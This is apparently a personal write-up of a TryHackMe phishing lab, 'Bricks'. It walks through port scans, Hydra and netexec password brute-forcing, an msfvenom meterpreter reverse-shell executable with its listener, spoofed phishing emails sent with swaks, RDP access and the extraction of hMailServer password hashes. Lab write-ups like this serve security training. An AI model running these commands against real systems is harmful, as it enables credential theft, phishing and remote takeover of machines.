@@ -1,0 +1,347 @@
+Bricks IP: 10.10.179.138
+
+Nmap:
+
+PORT     STATE SERVICE       REASON          VERSION
+25/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd
+| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+110/tcp  open  pop3          syn-ack ttl 127 hMailServer pop3d
+|_pop3-capabilities: UIDL TOP USER
+135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+143/tcp  open  imap          syn-ack ttl 127 hMailServer imapd
+|_imap-capabilities: IMAP4rev1 NAMESPACE SORT ACL QUOTA CAPABILITY CHILDREN OK completed RIGHTS=texkA0001 IMAP4 IDLE
+445/tcp  open  microsoft-ds? syn-ack ttl 127
+587/tcp  open  smtp          syn-ack ttl 127 hMailServer smtpd
+| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
+|_ssl-date: 2025-04-10T07:50:06+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=BRICK-MAIL
+| Issuer: commonName=BRICK-MAIL
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-04-09T07:48:01
+| Not valid after:  2025-10-09T07:48:01
+| MD5:   3918:f7bc:05f4:a377:052a:cf66:c91f:5156
+| SHA-1: 5370:e463:422f:82ad:e17b:7cc3:e340:3664:c67b:25c1
+| -----BEGIN CERTIFICATE-----
+| MIIC2DCCAcCgAwIBAgIQMZ1mTBfOcIJLmcC8Ah+KTzANBgkqhkiG9w0BAQsFADAV
+| MRMwEQYDVQQDEwpCUklDSy1NQUlMMB4XDTI1MDQwOTA3NDgwMVoXDTI1MTAwOTA3
+| NDgwMVowFTETMBEGA1UEAxMKQlJJQ0stTUFJTDCCASIwDQYJKoZIhvcNAQEBBQAD
+| ggEPADCCAQoCggEBANKAD7OT69ENYiCEuXch5qAIg//chlAigGDmTmVthvS34tbW
+| YAeRn6G7WgoW8Uzj0JCJQFXo9MAV6YR9GhmRoEXOUf0nB16QWiaRoPyigUpePKMd
+| 9WlKdfko4gnjsTMcuhmd0DbAoRVhtYUymmVy+IzTsbziHAS4XJYgzF1Eq/deZ3qG
+| lyL8KhY+ZgicvKAg7096NFF1szcDhNhPsjOOcsYWesiyIDZiQifRVT4NdTxsN4+5
+| PFVRgxH2eW9vvTD17bhz3GKGupFCA5U4j+17I0KGR2qKLF5S74uZIBFfO8zIfvRr
+| iwgByllHPLqw86Xyu+N0Vwx2bI5MKe93MZoSdhUCAwEAAaMkMCIwEwYDVR0lBAww
+| CgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQB3TEBA
+| /b21ShnZxORB7wASq9a0+gDsaS5O2O+sBl3LhlaLxse51OYcy8I64nT27QxQJCFq
+| g9uSwIHZktt3XcwPCZNioUjbJ3ihXp/dfslyeiRMoG7UicH1YvFigQ8h8hFzD1or
+| j0t9RTfz7GexaimRXglNzmO9tIdI6L48BOhJxEosvtmTk5Q75hkE1pVQNmFwEhzp
+| EiMm3UzsEAwwDiKz5bkz9ECx0ci1Chx+ebD5bsNj3gERjJumk0TMRWJ+W7AH4WON
+| V6EJGV7QFBwqXXp7Ki1sTaKue64jN3H73bqWWEV0KYVAK/kr42X6AgYH7iHwKA9L
+| KGrvS5Ztk0xVBBsb
+|_-----END CERTIFICATE-----
+| rdp-ntlm-info: 
+|   Target_Name: BRICK-MAIL
+|   NetBIOS_Domain_Name: BRICK-MAIL
+|   NetBIOS_Computer_Name: BRICK-MAIL
+|   DNS_Domain_Name: BRICK-MAIL
+|   DNS_Computer_Name: BRICK-MAIL
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-04-10T07:49:58+00:00
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=4/10%OT=25%CT=1%CU=31698%PV=Y%DS=2%DC=T%G=Y%TM=67F7
+OS:7830%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%
+OS:TS=U)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=RD%II=I%SS=S%TS=U)OPS(O1=M508NW8NN
+OS:S%O2=M508NW8NNS%O3=M508NW8%O4=M508NW8NNS%O5=M508NW8NNS%O6=M508NNS)WIN(W1
+OS:=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O
+OS:=M508NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T
+OS:=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=
+OS:0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=
+OS:Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=
+OS:Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=
+OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
+OS:RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2025-04-10T07:50:00
+|_  start_date: N/A
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 10438/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 21581/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 11131/udp): CLEAN (Timeout)
+|   Check 4 (port 35445/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT      ADDRESS
+1   92.86 ms 10.8.0.1
+2   92.90 ms 10.10.179.138
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 03:50
+Completed NSE at 03:50, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 03:50
+Completed NSE at 03:50, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 03:50
+Completed NSE at 03:50, 0.00s elapsed
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.12 seconds
+           Raw packets sent: 1350 (62.962KB) | Rcvd: 59813 (2.396MB)
+
+
+
+
+Rustscan:
+PORT      STATE SERVICE       REASON
+25/tcp    open  smtp          syn-ack ttl 127
+110/tcp   open  pop3          syn-ack ttl 127
+135/tcp   open  msrpc         syn-ack ttl 127
+139/tcp   open  netbios-ssn   syn-ack ttl 127
+143/tcp   open  imap          syn-ack ttl 127
+445/tcp   open  microsoft-ds  syn-ack ttl 127
+587/tcp   open  submission    syn-ack ttl 127
+3389/tcp  open  ms-wbt-server syn-ack ttl 127
+5985/tcp  open  wsman         syn-ack ttl 127
+7680/tcp  open  pando-pub     syn-ack ttl 127
+47001/tcp open  winrm         syn-ack ttl 127
+49664/tcp open  unknown       syn-ack ttl 127
+49665/tcp open  unknown       syn-ack ttl 127
+49666/tcp open  unknown       syn-ack ttl 127
+49667/tcp open  unknown       syn-ack ttl 127
+49668/tcp open  unknown       syn-ack ttl 127
+49669/tcp open  unknown       syn-ack ttl 127
+49672/tcp open  unknown       syn-ack ttl 127
+49673/tcp open  unknown       syn-ack ttl 127
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
+           Raw packets sent: 23 (988B) | Rcvd: 25 (1.076KB)
+
+
+Looking over the bricks page, we can get some emails. So I saved the emails into a file, and I want to run cewl in order to get some passwords, and try to log in to smtp.
+
+cewl --lowercase https://brownbrick.co/index.html > wordlist.txt
+
+We can then use hydra to see if we get a match on emails and passwd on smtp
+
+
+hydra -L emails.txt -P wordlist.txt -I -u smtp://10.10.179.138
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-10 03:55:37
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1008 login tries (l:7/p:144), ~63 tries per task
+[DATA] attacking smtp://10.10.179.138:25/
+[25][smtp] host: 10.10.179.138   login: lhedvig@brownbrick.co   password: bricks
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-10 03:56:14
+
+
+Since this is an phishing room, we can try to send an email with an executable.
+First we need to create a payload
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.76.182 LPORT=4444 -f exe > update.exe 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+
+
+start a metasploit listener:
+msfconsole -q                                                                           
+msf6 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.8.76.182
+LHOST => 10.8.76.182
+msf6 exploit(multi/handler) > show options
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.8.76.182      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.8.76.182:4444 
+
+
+
+
+
+
+
+and then send the mail:
+$ swaks \        
+> --to oaurelius@brownbrick.co \
+> --server 10.10.179.138 \
+> --from lhedvig@brownbric.co \
+> --attach update.exe \
+> --body 'Patch your security with this executable!' \
+> --port 25 \
+> --header 'Subject: Important from Security Team' \
+> --port 587 \
+> --auth-user 'lhedvig@brownbrick.co' \
+> --auth-password 'bricks'\
+> 
+=== Trying 10.10.179.138:587...
+=== Connected to 10.10.179.138.
+<-  220 BRICK-MAIL ESMTP
+ -> EHLO kali.home
+<-  250-BRICK-MAIL
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> AUTH LOGIN
+<-  334 VXNlcm5hbWU6
+ -> bGhlZHZpZ0Bicm93bmJyaWNrLmNv
+<-  334 UGFzc3dvcmQ6
+ -> YnJpY2tz
+<-  235 authenticated.
+ -> MAIL FROM:<lhedvig@brownbric.co>
+<-  250 OK
+ -> RCPT TO:<oaurelius@brownbrick.co>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> Date: Thu, 10 Apr 2025 04:05:10 -0400
+ -> To: oaurelius@brownbrick.co
+ -> From: lhedvig@brownbric.co
+ -> Subject: Important from Security Team
+ -> Message-Id: <20250410040510.021363@kali.home>
+ -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -> MIME-Version: 1.0
+ -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_21363"
+ -> 
+ -> ------=_MIME_BOUNDARY_000_21363
+ -> Content-Type: text/plain
+ -> 
+ -> Patch your security with this executable!
+ -> ------=_MIME_BOUNDARY_000_21363
+ -> Content-Type: application/octet-stream
+ -> Content-Disposition: attachment
+ -> Content-Transfer-Encoding: BASE64
+ -> 
+ -> dXBkYXRlLmV4ZQ==
+ -> 
+ -> ------=_MIME_BOUNDARY_000_21363--
+ -> 
+ -> 
+ -> .
+<-  250 Queued (0.094 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+
+if swaks doesn't work, we can do this:
+
+for email in $(cat emails.txt); do sendemail -f "lhedvig@brownbrick.co" -t "$email" -u "test" -m "test" -a shell.exe -s 10.10.178.177:25 -xu "lhedvig@brownbrick.co" -xp "bricks"; done
+Apr 10 05:21:08 kali sendemail[61580]: Email was sent successfully!
+Apr 10 05:21:09 kali sendemail[61589]: Email was sent successfully!
+Apr 10 05:21:10 kali sendemail[61606]: Email was sent successfully!
+Apr 10 05:21:12 kali sendemail[61615]: Email was sent successfully!
+Apr 10 05:21:13 kali sendemail[61624]: Email was sent successfully!
+Apr 10 05:21:14 kali sendemail[61641]: Email was sent successfully!
+
+we can then use get system from meterpreter to be NTAuthority
+
+
+way 2:
+
+run nxc on smb to try to bruteforce smb for the users that we already have:
+
+nxc smb 10.10.179.138 -u usernames.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
+SMB         10.10.179.138   445    BRICK-MAIL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:BRICK-MAIL) (domain:BRICK-MAIL) (signing:False) (SMBv1:False)
+SMB         10.10.179.138   445    BRICK-MAIL       [-] BRICK-MAIL\oaurelius:123456 STATUS_LOGON_FAILURE 
+SMB         10.10.179.138   445    BRICK-MAIL       [-] BRICK-MAIL\wrohit:123456 STATUS_LOGON_FAILURE 
+SMB         10.10.179.138   445    BRICK-MAIL       [-] BRICK-MAIL\lhedvig:123456 STATUS_LOGON_FAILURE 
+SMB         10.10.179.138   445    BRICK-MAIL       [-] BRICK-MAIL\tchikondi:123456 STATUS_LOGON_FAILURE 
+SMB         10.10.179.138   445    BRICK-MAIL       [-] BRICK-MAIL\pcathrine:123456 STATUS_LOGON_FAILURE 
+SMB         10.10.179.138   445    BRICK-MAIL       [-] BRICK-MAIL\fstamatis:123456 STATUS_LOGON_FAILURE 
+SMB         10.10.179.138   445    BRICK-MAIL       [-] BRICK-MAIL\oaurelius:12345 STATUS_LOGON_FAILURE 
+SMB         10.10.179.138   445    BRICK-MAIL       [-] BRICK-MAIL\wrohit:12345 STATUS_LOGON_FAILURE 
+
+
+
+after a while, we get a hit:
+
+SMB         10.10.179.138   445    BRICK-MAIL       [+] BRICK-MAIL\wrohit:superstar 
+
+
+we now can check if the user that we found is in rdp:
+
+ nxc rdp 10.10.179.138 -u "wrohit" -p "superstar"                                               
+RDP         10.10.179.138   3389   BRICK-MAIL       [*] Windows 10 or Windows Server 2016 Build 17763 (name:BRICK-MAIL) (domain:BRICK-MAIL) (nla:True)
+RDP         10.10.179.138   3389   BRICK-MAIL       [+] BRICK-MAIL\wrohit:superstar (Pwn3d!)
+                                                                                                                
+
+we can use remmina to rdp to this user, and get the flag:
+
+THM{l1v1n_7h3_br1ck_l1f3}
+
+
+
+
+second flag:
+path to flag: C://ProgramFilles(x86)/hmailServer/Bin/hMailServer(configuration file)
+
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=5f4dcc3b5aa765d61d8327deb882cf99
+[Database]
+Type=MSSQLCE
+Username=
+Password=47f104fa02185e821a83b2cfa56cf4ec
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+
+
+
+AdministratorPassword=5f4dcc3b5aa765d61d8327deb882cf99 is password
